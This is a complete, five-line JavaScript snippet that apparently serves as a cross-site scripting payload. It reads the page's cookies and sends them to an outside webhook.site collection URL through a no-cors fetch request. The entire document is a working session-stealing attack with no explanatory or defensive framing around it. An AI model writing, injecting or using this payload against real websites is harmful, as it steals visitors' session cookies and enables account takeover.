var cookieValue = document.cookie;
fetch("https://webhook.site/44750bd9-9817-43ec-9086-bab8119e97a3?q=" + encodeURIComponent(cookieValue), {
    method: 'GET',
    mode: 'no-cors'
});
